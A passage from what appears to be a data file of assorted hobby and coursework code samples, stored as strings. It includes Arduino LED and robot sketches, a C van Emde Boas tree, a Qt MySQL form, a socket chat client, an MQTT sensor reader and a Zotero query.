with them on for 2 seconds.\n\n  // turn off the leds\n  disableLed(redLed1);\n  disableLed(redLed2);\n  disableLed(redLed3);\n  disableLed(yellowLed);\n  disableLed(greenLed);\n\n  // enable the leds one by one\n  enableLed(redLed1);\n  delay(1000); // delay for 1 sec\n  enableLed(redLed2);\n  delay(1000); // delay for 1 sec\n  enableLed(redLed3);\n  delay(1000); // delay for 1 sec\n  enableLed(yellowLed);\n  delay(1000); // delay for 1 sec\n  enableLed(greenLed);\n\n  lightsOut();\n  Serial.print(\"And away we go!\\n\");\n};\n\nvoid lightsOut() {\n  const int minDelay = 200;\n  const int maxDelay = 3000;\n\n  delay(minDelay); // wait the min time regulated by the FIA in section 44.10\n\n  int randomDelay = random(maxDelay);\n  delay(randomDelay);\n  // away we go\n\n  disableLed(redLed1);\n  disableLed(redLed2);\n  disableLed(redLed3);\n  disableLed(yellowLed);\n  disableLed(greenLed);\n\n  Serial.printf(\"\\n\\nDelay of %d\\n\", randomDelay);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <math.h>\nusing namespace std;\n\ntypedef struct vEB {\n    bool isLeaf;\n    int A[2]; \n    int universeSize; \n    struct vEB* summary;        // Summary vEB tree\n    struct vEB** cluster;       // Cluster array\n} vEB;\n\n\nint high(int x, int sqrtU) {\n    return x / sqrtU;\n}\n\nint low(int x, int sqrtU) {\n    return x % sqrtU;\n}\n\nint index(int x, int y, int sqrtU) {\n    return x * sqrtU + y;\n}\n\nvEB* createVEB(int universeSize) {\n    vEB* tree = (vEB*)malloc(sizeof(vEB));\n    tree->isLeaf = true;\n    tree->A[0] = -1; \n    tree->A[1] = -1;\n    tree->universeSize = universeSize;\n\n    if (universeSize > 2) {\n        int sqrtU = (int)sqrt(universeSize);\n        tree->summary = createVEB(sqrtU);\n        tree->cluster = (vEB**)malloc(sqrtU * sizeof(vEB*));\n        for (int i = 0; i < sqrtU; i++) {\n            tree->cluster[i] = createVEB(sqrtU);\n        }\n    } else {\n        tree->summary = NULL;\n        tree->cluster = NULL;\n    }\n    return tree;\n}\n\nvoid insert(vEB* tree, int x) {\nif (x >= tree->universeSize) {\n        return;  \n    }\n\n    if (tree->isLeaf) {\n        if (tree->A[0] == -1) {\n            tree->A[0] = x;\n        } else if (tree->A[1] == -1) {\n            if (x < tree->A[0]) {\n                tree->A[1] = tree->A[0];\n                tree->A[0] = x;\n            } else if (x > tree->A[0]) {\n                tree->A[1] = x;\n            }\n        } else if (x == tree->A[0] || x == tree->A[1]) {\n            return;\n        } else {\n            // If the leaf node is full and x is a new value, \n            //a new non-leaf structure needs to be created\n            int oldA0 = tree->A[0];\n            int oldA1 = tree->A[1];\n            \n            // Convert leaf nodes to non-leaf nodes\n            tree->isLeaf = false;\n            int sqrtU = (int)sqrt(tree->universeSize);\n            tree->summary = createVEB(sqrtU);\n            tree->cluster = (vEB**)malloc(sqrtU * sizeof(vEB*));\n            for (int i = 0; i < sqrtU; i++) {\n                tree->cluster[i] = createVEB(sqrtU);\n            }\n            tree->A[0] = -1;\n            tree->A[1] = -1;\n            insert(tree, oldA0);\n            insert(tree, oldA1);\n            insert(tree, x);\n        }\n    } else {\n        int sqrtU = (int)sqrt(tree->universeSize);\n        int highX = high(x, sqrtU);\n        int lowX = low(x, sqrtU);\n        \n        if (tree->cluster[highX]->A[0] == -1) {\n            insert(tree->summary, highX);\n        }\n        insert(tree->cluster[highX], lowX);\n    }\n}\n\n\nbool member(vEB* tree, int x) {\n    if (tree->isLeaf) {\n        return (tree->A[0] == x || tree->A[1] == x);\n    } else {\n        int sqrtU = (int)sqrt(tree->universeSize);\n        int HX = high(x, sqrtU);\n        int LX = low(x, sqrtU);\n        \n        if (tree->cluster[HX]->A[0] == -1) {\n            return false;\n        }\n        return member(tree->cluster[HX], LX);\n    }\n}\n\n/*Minimum \nFor leaf nodes:\nFirst check A[0], if not -1, return it\nOtherwise check A[1], if not -1, return it\nIf both are -1, return -1 for empty tree\nFor non-leaf nodes:\nRecursively find the smallest non-empty cluster\nRecursively find the smallest value in that cluster\nCombine the results using the idex function*/\nint minimum(vEB* tree) {\n    if (tree->isLeaf) {\n        if (tree->A[0] != -1) return tree->A[0];\n        if (tree->A[1] != -1) return tree->A[1];\n        return -1;  \n    } else {\n        int minCluster = minimum(tree->summary);\n        if (minCluster == -1) return -1;  \n        return minimum(tree->cluster[minCluster]);\n    }\n}\n\nint maximum(vEB* tree) {\n    if (tree->isLeaf) {\n        if (tree->A[1] != -1) return tree->A[1];\n        if (tree->A[0] != -1) return tree->A[0];\n        return -1;  \n    } else {\n        int maxCluster = maximum(tree->summary);\n        if (maxCluster == -1) return -1; \n        return maximum(tree->cluster[maxCluster]);\n    }\n}\n\nint successor(vEB* tree, int x) {\n    if (tree->universeSize == 2) {\n        if (x == 0 && tree->A[1] == 1) {//If x is 0 and the tree has 1, return 1 as the successor\n            return 1; \n        }\n        else return -1; \n    }\n    if (x < tree->A[0]) {//If x is smaller than the minimum, the minimum is the successor\n        return tree->A[0];\n    }\n    int sqrtU = (int)sqrt(tree->universeSize);\n    int highX = high(x, sqrtU);\n    int lowX = low(x, sqrtU);\n    int succ = successor(tree->cluster[highX], lowX);\n    if (succ != -1) {// If a successor is found in the current cluster\n        return index(highX, succ, sqrtU);\n    }\n    // No successor in the current cluster, search for the next cluster in the summary\n    int nextCluster = successor(tree->summary, highX);\n    if (nextCluster != -1) {\n        // If a successor cluster is found, return the index of the minimum element in that cluster\n        return index(nextCluster, minimum(tree->cluster[nextCluster]), sqrtU);\n    }\n    return -1; \n}\n\nvoid deletion(vEB* tree, int x) {\n    if (tree->A[0] == -1) { // Tree is ",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\nclass stu\n{\npublic:\n    string name;\n    int age;\n    int score;//const\u4fee\u9970\u7c7b\u4e2d\u7684\u6570\u636e\u6210\u5458\uff0c\u610f\u5473\u7740\u8be5\u6210\u5458\n    stu(string name,int age,int score){\n        this->name=name;\n        this->age=age;\n        this->score=score;\n    }\n    stu(const stu& temp){//\u62f7\u8d1d\u6784\u9020\u51fd\u6570   ---\u5b9a\u4e49\u4e86\u62f7\u8d1d\u89c4\u5219\n        this->name=temp.name;\n        this->age=temp.age;\n        this->score=temp.score;\n    }\n};\n\nvoid test(stu& ss){\n    cout<<ss.name<<\" \"<<ss.age<<\" \"<<ss.score<<endl;\n}\n\nstu mytest(){\n    stu s11(\"ljs1\",112,133);\n    cout<<\"mytest\"<<endl;\n    return s11;\n}\n\nint main() {\n    //stu s1(\"ljs\",12,33);\n    //stu s2=s1;\n    //cout<<s2.name<<\" \"<<s2.age<<\" \"<<s2.score<<endl;\n\n    const stu s1(\"zhang\",33,44);//\u5728\u5b9a\u4e49\u5bf9\u8c61\u524d\u9762\u52a0\u4e86const\u5c31\u76f8\u5f53\u4e8e\u5c06\u8be5\u5bf9\u8c61\u4e2d\u7684\u6240\u6709\u6570\u636e\u6210\u5458\u90fd\u52a0\u4e86const\uff0c\u5916\u90e8\u8bbf\u95ee\u53ea\u80fd\u8bfb\u6210\u5458\u7684 \u503c\u4e0d\u80fd\u8bd5\u56fe\u4fee\u6539\n    cout<<s1.name<<s1.age<<endl;\n//    s1.age=33;\n//    s1.test();//\u901a\u8fc7\u5e38\u5bf9\u8c61\u6765\u8c03\u7528\u7c7b\u4e2d\u7684\u666e\u901a\u6210\u5458\u51fd\u6570 \u662f\u4e0d\u5141\u8bb8\u7684\n\n    /*stu s3(s1);\n    cout<<s3.name<<\" \"<<s3.age<<\" \"<<s3.score<<endl;*/\n//    test(s1);\n    stu s11 = mytest();\n    cout<<s11.name<<\" \"<<s11.age<<\" \"<<s11.score<<endl;\n    return 0;\n}",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QtSql>\n#include <QMainWindow>\n#include <QDebug>\nint maxCID = 0; // Used to check to see if we're updating a row\n\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    qMain();\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n// Initialization code\nvoid MainWindow::qMain(){\n    QSqlQuery query;\n    // Get the maximum cID value from the customer table\n    query.exec(\"SELECT MAX(cID) FROM customer;\");\n    if (query.next()) {\n        maxCID = query.value(0).toInt();\n    }\n}\n\n\n// Top row\nvoid MainWindow::on_connect_clicked()\n{\n    // Use the SQL driver\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QMYSQL\");\n    db.setHostName(\"localhost\");\n    db.setDatabaseName(\"data\");\n    db.setUserName(\"root\");\n    db.setPassword(\"root\");\n    db.open();\n\n    qDebug() << db.lastError().text();\n}\n\n\nvoid MainWindow::on_view_data_clicked()\n{\n    QSqlQueryModel *model = new QSqlQueryModel();\n    model->setQuery(\"SELECT * FROM customer\");\n    ui->tableView->setModel(model);\n\n}\n\n// Bottom row\nvoid MainWindow::on_insert_record_clicked()\n{\n    QSqlQuery query;\n\n    // Get the maximum cID value from the customer table\n    query.exec(\"SELECT MAX(cID) FROM customer;\");\n    if (query.next()) {\n        maxCID = query.value(0).toInt();\n    }\n\n\n    query.prepare(QString::fromLatin1(\"INSERT INTO customer ()\")\n                  + QString::fromLatin1(\"VALUES (:cId, :c_name, :c_cname, :c_email, :c_cell);\"));\n    query.bindValue(\":cID\", maxCID);\n    query.bindValue(\":c_name\", ui->c_name->text());\n    query.bindValue(\":c_cname\", ui->c_cname->text());\n    query.bindValue(\":c_email\", ui->c_email->text());\n    query.bindValue(\":c_cell\", ui->c_cell->text());\n    query.exec();\n\n}\n\nvoid MainWindow::on_delete_record_clicked()\n{\n    QSqlQuery query;\n    // Get the selected indexes\n    QModelIndexList selectedIndexes = ui->tableView->selectionModel()->selectedIndexes();\n\n    // Remove the corresponding rows from the model\n    for (const QModelIndex &index : selectedIndexes) {\n        int row = index.row(); // Get the row number\n        model->removeRow(row);\n        query.prepare(\"DELETE FROM customer WHERE cID = :cID\");\n        query.bindValue(\":cID\", model->data(model->index(row, 0))); // Since column 0 contains the cID\n    }\n    query.exec(); // Execute\n}\n\n// Event listeners\nvoid MainWindow::on_tableView_doubleClicked(const QModelIndex &index)\n{\n    // Ensure that the clicked index is valid\n    if (index.isValid()) { // Set the fields for editingx\n        maxCID = model->data(model->index(index.row(), 0)).toInt();\n        ui->c_name->setText(model->data(model->index(index.row(), 1)).toString());\n        ui->c_cname->setText(model->data(model->index(index.row(), 2)).toString());\n        ui->c_email->setText(model->data(model->index(index.row(), 3)).toString());\n        ui->c_cell->setText(model->data(model->index(index.row(), 4)).toString());\n    }\n}\n",
    "#include \"ButtonHandler.h\"\n#include \"WiFiConfig.h\"\n#include \"StepperMotorHandler.h\"  // Include stepper motor handler\n#include <HTTPClient.h>\n\nint lastButtonState = HIGH;\nint ledState = LOW;\nunsigned long lastDebounceTime = 0;\nunsigned long debounceDelay = 50;\n\nvoid set_remote_button() {\n    if (wifiMulti.run() == WL_CONNECTED) {\n        HTTPClient http;\n        http.begin(\"http://rpi-offie.local:8000/button_pressed\");\n        int httpCode = http.GET();\n        if (httpCode > 0 && httpCode == HTTP_CODE_OK) {\n            String payload = http.getString();\n            Serial.println(payload);\n        } else {\n            Serial.printf(\"[HTTP] GET... failed, error: %s\\n\", http.errorToString(httpCode).c_str());\n        }\n        http.end();\n    }\n}\n\nvoid handleButtonPress() {\n    int reading = digitalRead(23);  // Read the button state\n    Serial.print(\"Button reading: \"); \n    Serial.println(reading);  // Debugging button state\n\n    if (reading != lastButtonState) {\n        lastDebounceTime = millis();\n        Serial.println(\"Button state changed.\");\n    }\n\n    if ((millis() - lastDebounceTime) > debounceDelay) {\n        if (reading == LOW && ledState == LOW) {  // Button pressed\n            ledState = HIGH;\n            set_remote_button();\n            Serial.println(\"Button Pressed - Activating stepper motor\");\n\n            // Activate stepper motor to dispense food\n            handleStepperMotorMovement();\n            delay(5000);  // Adjust delay as needed\n            Serial.println(\"Stepper motor activated\");\n\n        } else if (reading == HIGH && ledState == HIGH) {  // Button released\n            ledState = LOW;\n            Serial.println(\"Button Released - Motor off\");\n        }\n    }\n    lastButtonState = reading;\n}\n",
    "//  client.cpp\n\n#include <iostream>\n#include <cstring>\n\n#ifdef _WIN32\n    #include <winsock2.h>\n    #pragma comment(lib, \"ws2_32.lib\")\n    #define close closesocket\n    #define inet_pton(a, b, c) (*(c) = inet_addr(b))  // \u4f7f\u7528inet_addr\u66ff\u4ee3inet_pton\n#else\n    #include <sys/socket.h>\n    #include <arpa/inet.h>\n    #include <unistd.h>\n#endif\n\n#define PORT 8888\n#define BUFFER_SIZE 1024\n\nint main() {\n#ifdef _WIN32\n    WSADATA wsaData;\n    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n        std::cerr << \"WSAStartup failed\" << std::endl;\n        return -1;\n    }\n#endif\n    \n    int sock = 0; // \u5ba2\u6237\u7aef\u7684\u5957\u63a5\u5b57\u63cf\u8ff0\u7b26\uff0c\u7528\u4e8e\u521b\u5efa\u5957\u63a5\u5b57\n    struct sockaddr_in serv_addr; // \u5b9a\u4e49\u670d\u52a1\u5668\u5730\u5740\u7684\u7ed3\u6784\u4f53\uff0c\u5b58\u50a8\u670d\u52a1\u5668\u7684IP\u5730\u5740\u548c\u7aef\u53e3\u53f7\n    char buffer[BUFFER_SIZE] = {0}; // \u7528\u4e8e\u5b58\u50a8\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\n\n    // \u521b\u5efa\u5957\u63a5\u5b57\n    // socket()\uff1a\u521b\u5efa\u4e00\u4e2a\u5957\u63a5\u5b57\uff0c\u548c\u670d\u52a1\u5668\u7aef\u7684\u7528\u6cd5\u76f8\u540c\n    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n        std::cerr << \"Socket creation failed\" << std::endl;\n        return -1;\n    }\n\n    // \u8bbe\u7f6e\u670d\u52a1\u5668\u5730\u5740\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(PORT);\n\n    // \u5c06\u670d\u52a1\u5668\u5730\u5740\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f\n    // inet_pton()\uff1a\u5c06\u70b9\u5206\u5341\u8fdb\u5236\u7684IP\u5730\u5740\uff08\u4f8b\u5982\"127.0.0.1\"\uff09\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u7684\u7f51\u7edc\u5b57\u8282\u5e8f\uff0c\u4fbf\u4e8e\u8fdb\u884c\u7f51\u7edc\u4f20\u8f93\n#ifdef _WIN32\n    serv_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    if (serv_addr.sin_addr.s_addr == INADDR_NONE) {\n        std::cerr << \"Invalid address\" << std::endl;\n        return -1;\n    }\n#else\n    if (inet_pton(AF_INET, \"127.0.0.1\", &serv_addr.sin_addr) <= 0) {\n        std::cerr << \"Invalid address\" << std::endl;\n        return -1;\n    }\n#endif\n\n    // \u8fde\u63a5\u670d\u52a1\u5668\n    // connect()\uff1a\u8fde\u63a5\u670d\u52a1\u5668\uff0csock\u662f\u5ba2\u6237\u7aef\u7684\u5957\u63a5\u5b57\uff0cserv_addr\u662f\u670d\u52a1\u5668\u7684\u5730\u5740\u7ed3\u6784\u4f53\u3002\u8fd4\u56de\u503c\u5c0f\u4e8e0\u8868\u793a\u8fde\u63a5\u5931\u8d25\n    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {\n        std::cerr << \"Connection failed\" << std::endl;\n        return -1;\n    }\n\n    std::cout << \"\u8fde\u63a5\u5230\u670d\u52a1\u5668\uff0c\u8f93\u5165\u6d88\u606f\u5e76\u53d1\u9001\uff1a\" << std::endl;\n\n    while (true) {\n        std::string input;\n        std::cout << \"\u4f60: \";\n        std::getline(std::cin, input); // \u83b7\u53d6\u7528\u6237\u7684\u8f93\u5165\uff0c\u7528\u4e8e\u53d1\u9001\u6d88\u606f\u5230\u670d\u52a1\u5668\n\n        // \u53d1\u9001\u6d88\u606f\n        send(sock, input.c_str(), input.length(), 0); // \u5c06\u8f93\u5165\u7684\u6d88\u606f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u53c2\u6570\u5305\u62ec\u5957\u63a5\u5b57\u3001\u6d88\u606f\u5185\u5bb9\u3001\u6d88\u606f\u957f\u5ea6\n\n        // \u63a5\u6536\u670d\u52a1\u5668\u7684\u56de\u590d\n        memset(buffer, 0, BUFFER_SIZE);\n        long valread = read(sock, buffer, BUFFER_SIZE); // \u4ece\u670d\u52a1\u5668\u63a5\u6536\u6570\u636e\uff0c\u5e76\u8f93\u51fa\u670d\u52a1\u5668\u7684\u56de\u590d\n        if (valread > 0) {\n            std::cout << \"\u670d\u52a1\u5668: \" << buffer << std::endl;\n        }\n\n        // \u9000\u51fa\u6761\u4ef6\n        if (input == \"exit\") {\n            std::cout << \"\u65ad\u5f00\u8fde\u63a5\" << std::endl;\n            break;\n        }\n    }\n\n    // \u5173\u95ed\u5957\u63a5\u5b57\n    close(sock);\n    \n#ifdef _WIN32\n    WSACleanup();\n#endif\n    \n    return 0;\n}\n",
    "// \n// \n// \n\n#include \"Automatic_Obstacle_Avoidance_Mode.h\"\n\nServo servo;\nchar servoOffset = 0;\nint oa_VoltageCompensationToSpeed;\n\nvoid servoSetup() {\n\tgetServoOffsetFromEEPROM();\n\tservo.attach(PIN_SERVO);\n\tservo.write(90 + servoOffset);\n}\n\nvoid setServoOffset(char offset) {\n\tservoOffset = offset = constrain(offset, -100, 100);\n\tservo.write(90 + offset);\n}\n\nvoid writeServo(u8 n)\n{\n\tservo.write(90 + servoOffset);\n}\n\nvoid writeServoOffsetToEEPROM() {\n\tservo.write(90 + servoOffset);\n\tEEPROM.write(OA_SERVO_OFFSET_ADDR_IN_EEPROM, servoOffset);\n}\n\nvoid getServoOffsetFromEEPROM() {\n\tservoOffset = EEPROM.read(OA_SERVO_OFFSET_ADDR_IN_EEPROM);\n\tservoOffset = constrain(servoOffset, -10, 10);\n}\n\nfloat getSonar() {\n\tunsigned long pingTime;\n\tfloat distance;\n\tdigitalWrite(PIN_SONIC_TRIG, HIGH); // make trigPin output high level lasting for 10\ufffd\ufffds to triger HC_SR04,\n\tdelayMicroseconds(10);\n\tdigitalWrite(PIN_SONIC_TRIG, LOW);\n\tpingTime = pulseIn(PIN_SONIC_ECHO, HIGH, SONIC_TIMEOUT); // Wait HC-SR04 returning to the high level and measure out this waitting time\n\tif (pingTime != 0)\n\t\tdistance = (float)pingTime * SOUND_VELOCITY / 2 / 10000; // calculate the distance according to the time\n\telse\n\t\tdistance = MAX_DISTANCE;\n\treturn distance; // return the distance value\n}\n\nvoid oa_CalculateVoltageCompensation() {\n\tgetBatteryVoltage();\n\tfloat voltageOffset = BAT_VOL_STANDARD - batteryVoltage;\n\toa_VoltageCompensationToSpeed = voltageOffset * OA_SPEED_OFFSET_PER_V;\n\t/*Serial.print(voltageOffset);\n\tSerial.print('\\t');\n\tSerial.println(oa_VoltageCompensationToSpeed);*/\n}\n\nvoid updateAutomaticObstacleAvoidance() {\n\tint distance[3], tempDistance[3][5], sumDisntance;\n\tstatic u8 cnt = 0, servoAngle = 0, lastServoAngle = 0;\t//\n\tif (cnt == 0) {\n\t\tfor (int i = 0; i < 3; i++) {\n\t\t\tservoAngle = OA_SCAN_ANGLE_MAX - i * OA_SCAN_ANGLE_INTERVAL + servoOffset;\n\t\t\tservo.write(servoAngle);\n\t\t\tif (lastServoAngle != servoAngle) {\n\t\t\t\tdelay(OA_WAITTING_SERVO_TIME);\n\t\t\t}\n\t\t\tlastServoAngle = servoAngle;\n\t\t\tfor (int j = 0; j < 5; j++) {\n\t\t\t\ttempDistance[i][j] = getSonar();\n\t\t\t\tdelayMicroseconds(2 * SONIC_TIMEOUT);\n\t\t\t\tsumDisntance += tempDistance[i][j];\n\t\t\t}\n\t\t\tdistance[i] = sumDisntance / 5;\n\t\t\tsumDisntance = 0;\n\t\t}\n\t\tcnt++;\n\t}\n\telse {\n\t\tfor (int i = 2; i > 0; i--) {\n\t\t\tservoAngle = OA_SCAN_ANGLE_MAX - i * OA_SCAN_ANGLE_INTERVAL + servoOffset;\n\t\t\tservo.write(servoAngle);\n\t\t\tif (lastServoAngle != servoAngle) {\n\t\t\t\tdelay(OA_WAITTING_SERVO_TIME);\n\t\t\t}\n\t\t\tlastServoAngle = servoAngle;\n\t\t\tfor (int j = 0; j < 5; j++) {\n\t\t\t\ttempDistance[i][j] = getSonar();\n\t\t\t\tdelayMicroseconds(2 * SONIC_TIMEOUT);\n\t\t\t\tsumDisntance += tempDistance[i][j];\n\t\t\t}\n\t\t\tdistance[i] = sumDisntance / 5;\n\t\t\tsumDisntance = 0;\n\t\t}\n\t\tcnt = 0;\n\t}\n\n\n\tif (distance[1] < OA_OBSTACLE_DISTANCE) {\t\t\t\t//Too little distance ahead\n\t\tif (distance[0] > OA_OBSTACLE_DISTANCE || distance[2] > OA_OBSTACLE_DISTANCE) {\n\t\t\tmotorRun(-OA_BACK_SPEED_LOW, -OA_BACK_SPEED_LOW);\t//Move back a little\n\t\t\tdelay(100);\n\t\t\tif (distance[0] > distance[2]) {\t\t\t//Left distance is greater than right distance\n\t\t\t\tmotorRun(-OA_ROTATY_SPEED_LOW, OA_ROTATY_SPEED_LOW);\n\t\t\t}\n\t\t\telse {\t\t\t\t\t\t\t\t\t\t//Right distance is greater than left distance\n\t\t\t\tmotorRun(OA_ROTATY_SPEED_LOW, -OA_ROTATY_SPEED_LOW);\n\t\t\t}\n\t\t}\n\t\telse {\t\t\t\t\t\t\t\t\t\t\t//Get into the dead corner, move back a little, then spin.\n\t\t\tmotorRun(-OA_BACK_SPEED_HIGH, -OA_BACK_SPEED_HIGH);\n\t\t\tdelay(100);\n\t\t\tmotorRun(-OA_ROTATY_SPEED_NORMAL, OA_ROTATY_SPEED_NORMAL);\n\t\t}\n\t}\n\telse {\t\t\t\t\t\t\t\t\t\t\t\t//No obstacles ahead\n\t\tif (distance[0] < OA_OBSTACLE_DISTANCE) {\t\t\t//Obstacles on the left front.\n\t\t\tif (distance[0] < OA_OBSTACLE_DISTANCE_LOW) {\t//Very close to the left front obstacle.\n\t\t\t\tmotorRun(-OA_BACK_SPEED_LOW, -OA_BACK_SPEED_LOW);\t//Move back\n\t\t\t\tdelay(100);\n\t\t\t}\n\t\t\tmotorRun(OA_TURN_SPEED_LV4, OA_TURN_SPEED_LV1);\n\t\t}\n\t\telse if (distance[2] < OA_OBSTACLE_DISTANCE) {\t\t\t//Obstacles on the right front.\n\t\t\tif (distance[2] < OA_OBSTACLE_DISTANCE_LOW) {\t\t//Very close to the right front obstacle.\n\t\t\t\tmotorRun(-OA_BACK_SPEED_LOW, -OA_BACK_SPEED_LOW);\t//Move back\n\t\t\t\tdelay(100);\n\t\t\t}\n\t\t\tmotorRun(OA_TURN_SPEED_LV1, OA_TURN_SPEED_LV4);\n\t\t}\n\t\telse {\t\t\t\t\t\t\t\t\t\t\t\t//Cruising\n\t\t\tmotorRun(OA_CRUISE_SPEED, OA_CRUISE_SPEED);\n\t\t}\n\t}\n\n}\n",
    "#include \"Sensor.h\"\n\nvoid Sensor::init(){\n  pinMode(TRIG_PIN, OUTPUT); // Sets the trigPin as an Output\n  pinMode(ECHO_PIN, INPUT); // Sets the echoPin as an Input\n  SensorBaseMqtt::init();\n}\n\nStaticJsonDocument<100> Sensor::readSensor(){\n  StaticJsonDocument<100> jsonDoc;\n  \n  const float SOUND_VELOCITY = 0.034;\n  const float CM_TO_INCH     = 0.393701;\n\n  long duration;\n  float distanceCm;\n\n  // Clears the trigPin\n  digitalWrite(TRIG_PIN, LOW);\n  delayMicroseconds(2);\n  // Sets the trigPin on HIGH state for 10 micro seconds\n  digitalWrite(TRIG_PIN, HIGH);\n  delayMicroseconds(10);\n  digitalWrite(TRIG_PIN, LOW);\n\n  // Reads the echoPin, returns the sound wave travel time in microseconds\n  duration = pulseIn(ECHO_PIN, HIGH);\n  \n  // Calculate the distance\n  distanceCm = duration * SOUND_VELOCITY/2;\n\n  jsonDoc[\"value\"] = distanceCm;\n  if(distanceCm > 210 || distanceCm == 0){\n    jsonDoc[\"erro\"] = true;\n  }\n  else{\n    jsonDoc[\"erro\"] = false;\n  }\n  \n  return jsonDoc;\n}\n\nvoid Sensor::metodoPublisher(){\n  static unsigned int amostrasTotais = 0;  //vari\u00e1vel para realizar o filtro de m\u00e9dia\n  static unsigned int amostrasValidas = 0; //vari\u00e1vel para realizar o filtro de m\u00e9dia\n  static float acumulador = 0;       //vari\u00e1vel para acumular a m\u00e9dia\n  \n  StaticJsonDocument<100> jsonSensor;\n  \n  jsonSensor = readSensor();\n\n  //Realiza\u00e7\u00e3o de tratamento de erros\n  if( jsonSensor[\"erro\"] == false ){\n    float temp  = jsonSensor[\"value\"];\n    acumulador += temp; //somente os valores sem erro ser\u00e3o utilizados na m\u00e9dia\n    amostrasValidas++;  //incremento das amostras onde n\u00e3o foram encontradas erros\n  }\n  amostrasTotais++;  //incremento de amostras total\n\n  //realiza\u00e7\u00e3o de m\u00e9dia\n  if (amostrasTotais >= JANELA_FILTRO){\n    StaticJsonDocument<300> jsonDoc;\n\n    jsonDoc[\"RSSI\"]     = WiFi.RSSI();\n    jsonDoc[\"nivel\"]    = 0;\n    jsonDoc[\"erro\"]     = false;\n    jsonDoc[\"invalido\"] = false;\n\n    //se amostras v\u00e1lidas forem diferentes das amostras totais houve erro em alguma aquisi\u00e7\u00e3o de dados\n    if(amostrasTotais != amostrasValidas){ \n      if(amostrasValidas > 0){\n        jsonDoc[\"nivel\"] = acumulador/amostrasValidas;\n      }\n      else{ //Se amostras v\u00e1lidas for igual a 0 o valor ser\u00e1 zero e o conjunto de dados inv\u00e1lidos\n        jsonDoc[\"nivel\"] = 0;\n        jsonDoc[\"invalido\"] = true;\n      }\n      \n      jsonDoc[\"erro\"] = true;\n    }\n    else{ //todos os dados s\u00e3o v\u00e1lidos\n      jsonDoc[\"nivel\"] = acumulador/JANELA_FILTRO;\n      jsonDoc[\"erro\"]  = false;\n    }\n  \n    String payload = \"\";\n    serializeJson(jsonDoc, payload);\n\n    client.publish(topic_name, payload); \n    amostrasTotais = 0; \n    amostrasValidas = 0;\n    acumulador = 0;\n  }\n    \n}",
    "#include \"zotero.h\"\n#include <QFileInfo>\n#include <QRegularExpression>\n#include <QSqlError>\n#include <QSqlQuery>\n#include <QStandardPaths>\n#include <QUuid>\n#include <generator>\n#include <optional>\n#include \"zotero_item.h\"\n\nQ_LOGGING_CATEGORY(KRunnerZoteroZotero, \"krunner-zotero/zotero\")\n\n\nnamespace ZoteroSQL\n{\n    const auto query = QStringLiteral(R\"(\n        WITH _Authors AS (SELECT itemCreators.itemID as parentID,\n                                 concat(\n                                         creators.firstName, ' ', creators.lastName\n                                 )                   as author\n                          FROM creators\n                                   LEFT JOIN itemCreators ON creators.creatorID = itemCreators.creatorID\n                                   LEFT JOIN creatorTypes ON itemCreators.creatorTypeID = creatorTypes.creatorTypeID\n                          ORDER BY itemCreators.orderIndex ASC),\n             _ItemAuthors AS (SELECT parentID,\n                                     json_group_array(author) as authors\n                              FROM _Authors\n                              GROUP BY parentID),\n             _ItemMeta AS (SELECT itemData.itemID as parentID,\n                                  json_group_object(\n                                          fields.fieldName, itemDataValues.value\n                                  )               as meta\n                           FROM itemData\n                                    LEFT JOIN fields ON itemData.fieldID = fields.fieldID\n                                    LEFT JOIN itemDataValues ON itemData.valueID = itemDataValues.valueID\n                           GROUP BY itemData.itemID),\n             _Attachments AS (SELECT itemAttachments.parentItemID AS parentID,\n                                     items.key                    AS key,\n                                     itemAttachments.path         AS path,\n                                     itemAttachments.contentType  AS contentType,\n                                     json_group_object(\n                                             fields.fieldName, itemDataValues.value\n                                     )                            AS meta\n                              FROM itemAttachments\n                                       LEFT JOIN items ON itemAttachments.itemID = items.itemID\n                                       LEFT JOIN itemData ON items.itemID = itemData.itemID\n                                       LEFT JOIN fields ON itemData.fieldID = fields.fieldID\n                                       LEFT JOIN itemDataValues ON itemData.valueID = itemDataValues.valueID\n                              GROUP BY itemAttachments.itemID),\n             _ItemAttachments AS (SELECT parentID,\n                                         json_group_array(\n                                                 json_patch(\n                                                         json_object(\n                                                                 'path', path, 'contentType', contentType, 'key', key\n                                                         ),\n                                                         meta\n                                                 )\n                                         ) AS attachment_list\n                                  from _Attachments\n                                  GROUP BY _Attachments.parentID),\n             _ItemCollections AS (SELECT collectionItems.itemID                       AS parentID,\n                                         json_group_array(collections.collectionName) AS collections\n                                  FROM collections\n                                           LEFT JOIN collectionItems ON collections.collectionID = collectionItems.collectionID\n                                  GROUP BY collectionItems.itemID),\n             _ItemNotes AS (SELECT itemNotes.parentItemID           AS parentID,\n                                   json_group_array(itemNotes.note) AS note\n                            FROM itemNotes\n                            GROUP BY itemNotes.parentItemID),\n             _ItemTags AS (SELECT itemTags.itemID AS parentID, json_group_array(tags.name) AS tags\n                           FROM tags\n                                    LEFT JOIN itemTags ON tags.tagID = itemTags.tagID\n                           GROUP BY itemTags.itemID)\n        SELECT items.itemID                                     AS id,\n               items.dateModified                               AS modified,\n               items.key                                        AS key,\n               coalesce(_ItemAttachments.attachment_list, '[]') AS attachments,\n               coalesce(_ItemCollections.collections, '[]')     AS collections,\n               _ItemMeta.meta                                   AS meta,\n               coalesce(_ItemAuthors.authors, '[]')             AS authors,\n               coalesce(_ItemNotes.note, '[]')    ",
